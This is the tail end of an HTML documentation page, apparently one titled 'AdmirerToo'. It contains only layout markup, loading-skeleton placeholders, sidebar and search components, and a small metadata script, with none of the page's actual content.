                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
                        <div class="pl-5">
                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                        </div>
                    </div>
                
                    <!-- User should be able to hide sidebar right -->
                    <doc-sidebar-right v-cloak></doc-sidebar-right>
                </div>

            </div>
        </div>
    
        <doc-search-mobile></doc-search-mobile>
        <doc-back-to-top></doc-back-to-top>
    </div>


    <div id="docs-overlay-target"></div>

    <script>window.__DOCS__ = { "title": "AdmirerToo", level: 4, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false }</script>
</body>
</html>
